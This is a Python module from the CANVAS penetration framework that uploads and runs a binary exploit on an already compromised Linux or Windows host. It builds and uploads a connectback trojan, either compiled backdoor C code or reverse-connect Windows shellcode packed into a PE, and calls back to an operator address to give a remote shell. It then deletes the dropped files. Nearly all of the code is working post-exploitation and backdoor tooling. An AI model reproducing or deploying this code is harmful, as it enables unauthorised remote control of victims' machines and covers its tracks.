#! /usr/bin/env python

# sys imports
import sys

# CANVAS imports
from exploitutils import *
from canvaserror import *

from ExploitTypes.localcommand import LocalCommand

# path appends
if '.' not in sys.path:
    sys.path.append('.')

NAME = "Upload And Exploit"
DESCRIPTION = "Upload and Excute a shell-giving Exploit Binary"
DOCUMENTATION = {}

VERSION = "1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Linux"], ["Windows"] ]

DOCUMENTATION['NOTES'] = """
This module allows you to integrate binary based exploits into CANVAS.
Right now you can use it to run anything that returns a shell with
elevated priviledges on Linux or Windows.

Remember to run the 'exit' module on the new node when you're done with
it, if you wish to revert the old node back to MOSDEF. Or use a trojan
that forks and detaches daemon style.
"""

DEVNOTES = """
Started with Linux because that's where our greatest need for tying in
binary exploits is right now. Once the kinks are out here, it should be
a fairly convenient port to anything else shellshock supported.

To test base functionality .. examples: 

runmodule upexec -O filename:/bin/sh -O arguments:-i -O cmdline:1
runmodule upexec -O filename:/bin/ls -O arguments:-alrt+/etc/ -O cmdline:1
runmodule upexec -O filename:/tmp/cmd.exe -O arguments:/c+echo+hello -O cmdline:1
runmodule upexec -O filename:/bin/dash -O arguments:-c+export -O environment:A=1\\x2b2+LDTRACE_LOADED_OBJECTS=1 -O cmdline:1

The cmdline option controls whether or not you get a full shell, or if
it attempts to upload a trojan and get a MOSDEF connectback from that.

To debug a GUI style operation (with a trojan creation/upload/execute):

runmodule upexec -O filename:/bin/sh -l 192.168.1.103 -d 8081

XXX: our commandline parser blindly splits on spaces .. so
XXX: -O arguments:"-alrt /etc/" ends up as "-alr .. bad.
XXX: this should not be an issue from GUI, but for commandline
XXX: workaround .. use '+' instead of spaces

This will upload the specified binary, execute it, return any results
or handle any resulting shell, and then unlink the uploaded binary.

TODO:

- quick port to solaris when kinks are out
- basepath needs noexec checks (/dev/shm might be mounted noexec)

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name = NAME
        self.node = None
        self.filename = ""
        self.arguments = ""
        self.environment = None
        self.trojanpath = ""
        self.cmdline = 0
        return

    def neededListenerTypes(self):
        # cmdline will just handle the shell directly
        if self.cmdline:
            return []
        # from gui we try to get a MOSDEF callback
        # by uploading a trojan and executing the trojan
        # from our upexec_singlecommand handler
        else:
            import canvasengine
            self.node = self.argsDict["passednodes"][0]

            if self.node.nodetype == "linuxNode":
                return [canvasengine.LINUXMOSDEF]

            elif self.node.nodetype == "win32Node":
                return [canvasengine.WIN32MOSDEF]
            else:
                self.log("[X] nodeType not supported for trojan method !")

        return []

    def buildTrojan(self, type="Linux", arch="X86"):
        "build a MOSDEF based trojan binary"

        mosdeftrojan = ""

        if type in ["Linux", "Solaris"]:

            from MOSDEF import makeexe
            from MOSDEF.cc import threadsafe_cc_main

            self.log("[!] Compiling Unix trojan")
            infilename = "backdoors/cback_mmap_rwx.c"
            vars = {}
            vars['CBACK_PORT'] = self.callback.port
            vars['CBACK_ADDR'] = str2int32(socket.inet_aton(self.callback.ip))
            self.log("[!] Callback address is %s"%vars['CBACK_ADDR'])
            cc_command = []
            for var in vars:
                cc_command += ["-D","%s=%s"%(var,vars[var])]
            cc_command += ["-v","-m",type,"-p",arch,infilename]
            self.log("[!] CC command: %s"%cc_command)
            mosdeftrojan = threadsafe_cc_main(cc_command)
            if not mosdeftrojan:
                self.log("[X] Was unable to create trojan!")
                return ""

            self.log("[!] Length of CC compiled trojan: %s"% len(mosdeftrojan))

        elif type in ["Windows"]:

            from MOSDEF import pelib

            from shellcode import shellcodeGenerator
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : self.callback.port, "ipaddress" : self.callback.ip})
            sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread",None)

            shellcode = sc.get()

            myPElib = pelib.PElib()
            mosdeftrojan = myPElib.createPEFileBuf(shellcode)
            if mosdeftrojan == None:
                self.log("Some sort of error compiling our PE")
                return ""

            self.log("[!] Win32 MOSDEF Trojan compiled to %d bytes"%len(mosdeftrojan))
            
        return mosdeftrojan

    def nodeUpload(self, src, dst):
        "upload a file to a node and build a trojan if necessary"

        # XXX: make sure a node has upload function
        # XXX: when adding a supported node to this
        try:
            ret = self.node.upload(src, destfilename = dst)
        except NodeCommandError, i:
            self.log("[!] Failed to upload %s to %s: %s" % (src, dst, str(i)))
            return 0

        
        self.log("[!] upload succeeded !")
        return 1

    # there's no way around select for this sort of thing
    # because it's the only way we can silently tell whether
    # we are a shell or MOSDEF .. which controls what kind
    # of data we can send .. kept it as gui and MOSDEF friendly
    # as possible

    def select_socket_for_reading(self, sockfd, timeout=0.1):
        "needed for our single command handler"

        import select
        try:
            rd, wr, ex = select.select([sockfd], [], [], timeout)
        except TypeError:
            print "Typeerror on select: sockfd is %s type"%type(sockfd)
            raise
        except select.error, (errcode, errmsg):
            print "[D] select %d %s"% (errcode, errmsg)
            if errcode == 10038: # win32 ENOTSOCK KLUDGE
                import os
                if os.name != 'nt':
                    raise
                while True:
                    rd, wr, ex = select.select([sockfd], [], [], timeout)
                    if rd != []:
                        return (rd, [], [])
            raise select.error

        return (rd, [], [])        

    def gui_singlecommand(self, command, endian="small", msleeptime=0.1):
        "a upexec loop handler we can use from the gui"

        print "[!] entering single upexec command handling"
        
        # prompt loop
        i = 5
        import time
        while i:
            time.sleep(msleeptime)
            i -= 1
        import struct
        import select

        commandsent = 0
        exitsent = 0
        retval = 0

        # XXX: we can't just blindly dump on the socket assuming there's a shell
        # XXX: because that would kill our MOSDEF if it's not a shell ..

        while 1:
            print "[!] upexec data loop entry point .."
            try:
                rd, wr, ex = self.select_socket_for_reading(self.node.shell.connection, timeout=2)
            except KeyboardInterrupt:
                self.node.shell.node.parentnode.send(self.node.shell.connection, "exit\n")

            # dump the command while we're not mosdef ..
            # self.node.shell.node.parentnode.send(self.node.shell.connection, command)

            # using sendstring protocol (so should be MOSDEF safe I think)
            if self.node.shell.connection in rd:
                buf = ""
                while len(buf) < 4:
                    tbuf = self.node.shell.connection.recv(4 - len(buf))
                    if len(tbuf) == 0:
                        break
                    buf += tbuf

                if len(tbuf) == 0:
                    retval = -1
                    break

                if endian == "big":
                    datalen = struct.unpack(">L", buf)[0]
                elif endian == "small":
                    datalen = struct.unpack("<L", buf)[0]
                else: # assume small on typos :P
                    datalen = struct.unpack("<L", buf)[0]
                    
                if datalen == 0:
                    devlog('upexec_singlecommand', "peer finished sending data")
                    print "[!] upexec loop exited .. reverting to MOSDEF"
                    break

                devlog('upexec_singlecommand', "trying to receive %d byte(s) from socket..." % datalen)

                lastchar = '\n'
                while datalen > 0:
                    # print "[!] datalen: %d / %X"%(datalen, datalen)
                    data = self.node.shell.connection.recv(datalen)
                    tlen = len(data)
                    if tlen == 0: # connection reset by peer
                        self.node.shell.connection.close()
                        break
                    lastchar = data[-1]
                    datalen -= tlen

                    #self.log(iso8859toascii(data))
                    print iso8859toascii(data)

                if datalen > 0 and tlen == 0:
                    #if lastchar != '\n':
                    #    sys.stdout.write('\n')
                    print "Connection reset by peer, we missed %d byte(s)" % datalen
                    retval = -1
                    break
            else:
                # ok so what happens is our trojan binary does not fork to the background
                # that means it will take over our existing MOSDEF process untill we're done
                # with the new MOSDEF .. if we make our trojan fork and detach daemon wise
                # it will behave nicer .. but this is usable too.

                # note that unlink cleanup only happens when we revert back to our OLD MOSDEF

                # timed out .. so we know we're not in a MOSDEF .. send our single command ..
                if not commandsent:
                    self.log("[!] likely shell on this node ! starting our connectback trojan !")
                    self.node.shell.node.parentnode.send(self.node.shell.connection, command)
                    commandsent = 1

                elif not exitsent:
                    # this should drop us into a 'upexec loop exited' revert to MOSDEF !
                    self.node.shell.node.parentnode.send(self.node.shell.connection, "exit\n")
                    exitsent = 1

                    self.log("[!] IMPORTANT: exit the new MOSDEF node when you're done with it")
                    self.log("[!] IMPORTANT: if not, make sure you clean up your binaries by hand")

        print "[!] done with upexec single command handling"
        return retval

    def trojanNode(self, basepath, type="Linux", arch="X86"):
        "upload a connectback trojan to a node"

        # if we're in gui, build and upload a trojan for MOSDEF callback
        trojanbin = self.buildTrojan(type=type, arch=arch)
        if trojanbin != "":
            if type == "Linux":
                self.trojanpath = basepath + ".%.4d"% random.randint(0, 100)
            if type == "Windows":
                self.trojanpath = basepath + "W%.4d.exe"% random.randint(0, 100)

            # XXX: how do i upload a string based trojan to the node !?
            trojanfile = open("localtrojan.bin", "wb")
            trojanfile.write(trojanbin)
            trojanfile.close()
            
            # place the trojan in self.trojanpath
            if not self.nodeUpload("localtrojan.bin", self.trojanpath):
                self.log("[X] upload failed !")
                return 0
            else:
                self.log("[!] uploaded trojan binary to dst: %s"% self.trojanpath)
                return 1
        else:
            self.log("[X] error building trojan binary!")
            return 0


    def LinuxUpExec(self, filename):
        "handle exec on a Linux node"

        # need to do noexec tests on this
        basepath = "/dev/shm/"

        # seed destination name
        import random
        random.seed()
        dst = basepath + ".%.4d"% random.randint(0, 100)
 
        # upload actual target binary
        if not self.nodeUpload(filename, dst):
            self.log("[X] upload failed !")
            return 0
        else:
            self.log("[!] uploaded src: %s to dst: %s"% (filename, dst))

        # place trojan binary if needed
        if not self.cmdline:
            self.trojanNode(basepath, type="Linux", arch="X86")

        # if we got the arguments as a "arg1 arg2 arg3" remove the quotes
        if self.arguments != "" and self.arguments[0] in ['"', '\'']:
            self.arguments = self.arguments[1:-1]

        # XXX: temporary commandline spaces fix .. replace '+' with ' '
        self.arguments = self.arguments.replace('+', ' ')

        # turn arguments into a list
        if self.arguments != "":
            self.arguments = self.arguments.split(' ')

        argc = len(self.arguments)

        vars = {}
        # shell is now 'command'
        vars["shell"] = dst # XXX: remember to add on an unlink or srm

        # feed in all the arguments
        for i in range(argc):
            vars["arg%d"% i] = self.arguments[i]

        vars["mosdefd"] = self.node.shell.fd

        code="""
        #import "string", "shell" as "shell"
        #import "int", "mosdefd" as "mosdefd"
        
        //ARGSREPLACE
        //ENVREPLACE

        #import "local", "pipe" as "pipe"
        #import "local", "dup2" as "dup2"
        #import "local", "close" as "close"
        #import "local", "execve" as "execve"
        #import "local", "read" as "read"
        #import "local", "fork" as "fork"
        #import "local", "write" as "write"
        #import "local", "sendstring" as "sendstring"
        #import "local", "sendint" as "sendint"
        #import "local", "select" as "select"
        #import "local", "memset" as "memset"
        #import "local", "exit" as "exit"

        void main()
        {
            //EXECREPLACE
            //char *exec[3]
            //ENVPTRREPLACE

            char in[512];
            char out[512];
  
            int pid;
            int rfd;
            int wfd;
            int len;
            int n;
            int i;
            int div;
            int tmp;
            int rfdindex;
            int mosindex;
            int mosoffset;
            int rfdoffset;
            int crfds;
            int mosisset;

            int localmask[32];
            int write_pipe[2];
            int read_pipe[2];

            exec[0] = shell;
            //SETARGS
            //exec[1] = dashi;
            //exec[2] = 0;
            //ENVARGS

            pipe(write_pipe);
            pipe(read_pipe);

            pid = fork();

            if (pid == 0)
            {
                close(1);
                close(2);
                dup2(write_pipe[0], 0);
                dup2(read_pipe[1], 1);
                dup2(read_pipe[1], 2);
                close(read_pipe[0]);
                execve(exec[0], exec, env);
                // if the execve fails .. we need to continue
                sendint(0);
                return;
            }

            // runCode compatible , sendint to indicate success
            sendint(1);

            close(read_pipe[1]);
            close(write_pipe[0]);
            rfd = read_pipe[0];
            wfd = write_pipe[1];

            rfdindex = 0;

            if (rfd > 31) 
            {
                rfdindex = rfd;
                while(rfdindex > 31) 
                {
                    rfdindex = rfdindex - 32;
                }
            }
            else 
            {
                rfdindex = rfd;
            }
            mosindex = 0;
            if (mosdefd > 31) {
                mosindex = mosdefd;
                while(mosindex > 31) {
                    mosindex = mosindex - 32;
                }
            }
            else {
                mosindex = mosdefd;
            }

            i = 0;
            div = rfd;
            while (div > 31)
            {
                i = i+1;
                div = div - 32;
            }
            rfdoffset = i;
            i = 0;
            div = mosdefd;
            while (div > 31)
            {
                i = i+1;
                div = div - 32;
            }
            mosoffset = i;

            while(1)
            {
                memset(&localmask, 0, 128);
                localmask[rfdoffset] = 1<<rfdindex;
                tmp = localmask[mosoffset];
                div = 1<<mosindex;
                localmask[mosoffset] = tmp | div;

                if (rfd > mosdefd)
                {
                    n = rfd + 1;
                }   
                else
                {
                    n = mosdefd + 1;
                }   

                crfds = 0;
                mosisset = 0;
                if (select(n, &localmask, 0, 0, 0) > 0)
                {

                    tmp = localmask[mosoffset];
                    mosisset = tmp>>mosindex;
                    mosisset = mosisset & 1;
                    tmp = localmask[rfdoffset];
                    crfds = tmp>>rfdindex;
                    crfds = crfds & 1;

                    if (mosisset == 1)
                    {
                        memset(&out, 0, 512);
                        len = read(mosdefd, out, 511);
                        if (len > 0)
                        {
                            write(wfd, out, len);
                        }
                    }
                    if (crfds == 1)
                    {
                        memset(&in, 0, 512);
                        len = read(rfd, in, 511);
                        if (len > 0)
                        {
                            sendstring(in);
                        }
                        else
                        {
                            sendint(0);
                            return;
                        }
                    }
                }
                else
                { 
                    sendint(0);
                    return;
                }
            }
        }
        """

        # our variable amount of args handling :>

        argsReplace = ""
        for i in range(argc):
            argsReplace += "#import \"string\", \"arg%d\" as \"arg%d\"\n"% (i, i)
        code = code.replace("//ARGSREPLACE", argsReplace)

        execReplace = "char *exec[%d];\n"% (argc + 1 + 1) # shell + null
        code = code.replace("//EXECREPLACE", execReplace)

        setArgs = ""
        for i in range(argc):
            setArgs += "exec[%d] = arg%d;\n"% (i+1, i)
        setArgs += "exec[%d] = 0;\n"% (argc + 1)
        code = code.replace("//SETARGS", setArgs)

        if self.environment is None:
            code=code.replace("//ENVPTRREPLACE","int env;")
            code=code.replace("//ENVARGS","env=0;")
        else:
            env=[x.decode('string_escape') for x in self.environment.replace('+',' ').split()]
            code=code.replace("//ENVPTRREPLACE","char *env[%d];"%(len(env)+1))
            code=code.replace("//ENVARGS",''.join(["env[%d]=env%d;\n"%(idx,idx) for idx in range(len(env))])+'env[%d]=0;\n'%(len(env)))

            for idx,e in enumerate(env): vars["env%d"%idx]=e
            code=code.replace('//ENVREPLACE',''.join(['#import "string","env%d" as "env%d"\n'%(idx,idx) for idx,e in enumerate(env)]))

        #print code

        # to make it runCode compatible, we need an extra sendint() for execve result
        ret = self.node.shell.runCode(code, vars)
        if ret:
            ret = self.LinuxHandler()
        else:
            self.log("[X] failed to execute binary ...")

        # unlink the binary .. should eventually be a safe rm
        # we could re-upload a zero file a couple of times
        # but would be pointless on journaling systems

        self.log("[!] unlinking %s"% dst)
        self.node.shell.dounlink(dst)

        # unlink the trojan binary if needed
        if not self.cmdline:
            self.log("[!] unlinking %s"% self.trojanpath)

        return ret
        

    def LinuxHandler(self):
        "handle exec result on success"
        # XXX: replace this with something gui friendly !!!
        if self.cmdline:
            return self.node.shell.upexec_loop(endian="small")

        # the trojan handler for gui based operation
        else:
            print "NO GUI HANDLER YET !? EXECUTE TROJANPATH IN BACKGROUND !?"
            command = "%s &\n"% self.trojanpath
            return self.gui_singlecommand(command)

    def WindowsUpExec(self, filename):
        "handle exec on a Win32 node"

        basepath = "C:\\"

        # seed destination name
        import random
        random.seed()
        dst = basepath + "W%.4d"% random.randint(0, 100) + ".exe"
 
        # upload
        if not self.nodeUpload(filename, dst):
            self.log("[X] upload failed !")
            return 0
        else:
            self.log("[!] uploaded src: %s to dst: %s"% (filename, dst))

        # place trojan binary if needed
        if not self.cmdline:
            self.trojanNode(basepath, type="Windows", arch="X86")

        # if we got the arguments as a "arg1 arg2 arg3" remove the quotes
        if self.arguments != "" and self.arguments[0] in ['"', '\'']:
            self.arguments = self.arguments[1:-1]

        # XXX: temporary commandline spaces fix .. replace '+' with ' '
        self.arguments = self.arguments.replace('+', ' ')

        cmdexe = self.node.shell.getComSpec()
        
        (ret,hChildStdinRd,hChildStdinWr) = self.node.shell.CreatePipe()
        if ret == 0:
            self.log("[X] Failed to create pipe!")
            return ret

        (ret,hChildStdinWrDup) = self.node.shell.DuplicateHandle(hChildStdinWr)
        if ret == 0:
            self.log("Failed to duplicate handle for writing")
            return ret

        (ret,hChildStdoutRd,hChildStdoutWr) = self.node.shell.CreatePipe()
        if ret==0:
            self.log("Failed to create stdout pipe!")
            return ret

        (ret,hChildStdoutRdDup) = self.node.shell.DuplicateHandle(hChildStdoutRd)
        if ret == 0:
            self.log("Failed to duplicate handle for reading")
            return ret

        self.node.shell.CloseHandle(hChildStdoutRd)
        self.node.shell.CloseHandle(hChildStdinWr)

        # because we know the full commandline already we don't
        # have to do the modulename nonsense, but should be just
        # able to null the first arg to create process and feed
        # feed in the full commandline .. i hope :>
        command = dst + ' ' + self.arguments
        self.log("[!] win32 commandline set to: %s"% command)
        
        vars = {}

        vars["command"] = command
        vars["cmdexe"] = cmdexe
        vars["stdin"] = hChildStdinRd
        vars["stdout"] = hChildStdoutWr
        vars["mosdefd"] = self.node.shell.fd
        vars["readfd"] = hChildStdoutRdDup
        vars["writefd"] = hChildStdinWrDup

        code="""
        #import "remote","kernel32.dll|GetStartupInfoA" as "getstartupinfoa"
        #import "remote","kernel32.dll|CreateProcessA" as "createprocessa"
        #import "remote", "kernel32.dll|ReadFile" as "readfile"
        #import "remote", "kernel32.dll|WriteFile" as "writefile"
        #import "remote", "kernel32.dll|PeekNamedPipe" as "peeknamedpipe"
        #import "remote", "ws2_32.dll|select" as "select"
        #import "remote", "ws2_32.dll|recv" as "recv"
        #import "remote", "kernel32.dll|CloseHandle" as "closehandle"
        #import "local", "memset" as "memset"
        #import "local", "writeblock" as "writeblock"
        #import "local", "sendint" as "sendint"
        #import "string","cmdexe" as "cmdexe"
        #import "string","command" as "command"
        #import "int", "stdin" as "stdin"
        #import "int", "stdout" as "stdout"
        #import "int", "mosdefd" as "mosdefd"
        #import "int", "readfd" as "readfd"
        #import "int", "writefd" as "writefd"
       
        #import "local", "debug" as "debug"
        
        struct STARTUPINFO {
            int cb;
            char * lpReserved;
            char * lpDesktop;
            char * lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            int * lpReserved2;
            int hStdInput;
            int hStdOutput;
            int hStdError;
            };

        struct timeval {
            int tv_sec;
            int tv_usec; 
            };

        void main() {
            struct timeval tv;
            struct STARTUPINFO si;
            int inherithandles;
            int i;
            int n;
            int noread;
            int numread;
            int numwritten;
            char in[512];
            char out[512];
            char pi[32];
            int fd_set[2];
            char check1;
            char check2;

            char peekcheck[2];
          
            memset(pi,0,16);
            inherithandles = 1;
            getstartupinfoa(&si);
            si.dwFlags = 0x0101; //STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
            si.wShowWindow = 0;
            si.hStdInput = stdin;
            si.hStdOutput = stdout;
            si.hStdError = stdout;
            //i = createprocessa(cmdexe,command,0,0,inherithandles,0,0,0,&si,pi);
            //XXX: for this we just want to specify the full commandline
            i = createprocessa(0,command,0,0,inherithandles,0,0,0,&si,pi); 
            sendint(i);
 
            // close stdoutwr and stdinrd
            closehandle(stdout);
            closehandle(stdin);

            // main io loop (bit of a kludge, but it'll do for now)
            while(1)
            {

                fd_set[0] = 1; // actual n
                fd_set[1] = mosdefd;
                n = 2; // ignored
                tv.tv_sec = 0;
                tv.tv_usec = 10;
                // very small timeout
                i = select(n, &fd_set, 0, 0, &tv);
                if (i != 0)
                {
                    memset(&in, 0, 512);
                    i = recv(mosdefd, in, 511, 0);
                    //dump to filehandle
                    writefile(writefd, in, i, &numwritten, 0);
                }

                //debug();
                i = 1;
                // dump response from cmd.exe back to remote
                while (i != 0) 
                {
                    memset(&peekcheck, 0, 2);
                    noread=0;
                    n = peeknamedpipe(readfd, peekcheck, 1, &numread, &numwritten, 0);
                    if(n == 0)
                    {
                        // process is gone, prolly exited :P
                        writeblock(mosdefd, &n, 4); 
                        // be shellshock_loop non-xor compatible
                        return;
                    }
                    check1 = peekcheck[0];
                    check2 = peekcheck[1];
                    if(check1 == check2)
                    {
                        noread = 1;
                        i = 0;
                    }
                    numread = 0;
                    if (noread == 0)
                    {
                        memset(&out, 0, 512);
                        i = readfile(readfd, out, 511, &numread, 0);
                    }
                    // i want && support !
                    if(i != 0)
                    {
                        if (numread != 0)
                        {
                            //sendint(numread);
                            writeblock(mosdefd, &numread, 4); 
                            // be shellshock_loop non-xor compatible
                            writeblock(mosdefd, out, numread);
                        }
                    }
                }
            }
        }
        
        """

        # already runCode compatible due to createprocess status send
        ret = self.node.shell.runCode(code, vars)
        if ret:
            ret = self.WindowsHandler(cmdexe)
        else:
            self.log("[X] failed to execute binary ...")

        # unlink the binary .. should eventually be a safe rm
        # we could re-upload a zero file a couple of times
        # but would be pointless on journaling systems

        self.log("[!] unlinking %s"% dst)
        self.node.shell.dounlink(dst)

        if not self.cmdline:
            self.node.shell.dounlink(self.trojanpath)

        # close dup handles
        self.node.shell.CloseHandle(hChildStdoutRdDup)
        self.node.shell.CloseHandle(hChildStdinWrDup)

        return ret

    def WindowsHandler(self, cmdexe):
        "handle exec result on success"
        if self.cmdline:
            return self.node.shell.upexec_loop(endian="small")
        else:
            # execute uploaded trojan for MOSDEF callback
            command = cmdexe + " /c %s\n"% self.trojanpath
            return self.gui_singlecommand(command)

    def SolarisUpExec(self, filename):
        "handle exec on a Solaris node"
        return

    def SolarisHandler(self):
        "handle exec result on success"
        return

    def getArgs(self):
        # local filename/path
        self.filename = self.argsDict.get("filename", self.filename)
        self.arguments = self.argsDict.get("arguments", self.arguments)
        self.environment = self.argsDict.get("environment", self.environment)
        self.cmdline = int(self.argsDict.get("cmdline", self.cmdline))
        self.node = self.argsDict["passednodes"][0]

    def run(self):
        self.getArgs()
        ret = 0

        # to add supported nodes "nodeType":handler()
        nodeTypes = { "linuxNode":self.LinuxUpExec, "win32Node":self.WindowsUpExec }

        # supported node type checks
        if self.node.nodetype not in nodeTypes:
            self.log("[X] node type not supported yet ...")
        # pass onto correct platform handler
        else:
            # returns success / failure post-handling
            ret = nodeTypes[self.node.nodetype](self.filename)

            if self.ISucceeded():
                self.log("[!] GUI trojan callback method worked !")
                self.setInfo("Got MOSDEF node from binary exploit (success)")
            else:
                self.log("[!] GUI trojan callback method failed .. commandline ?")
                self.setInfo("Did not get MOSDEF node from binary exploit (failed)")

        # EOP
        return ret

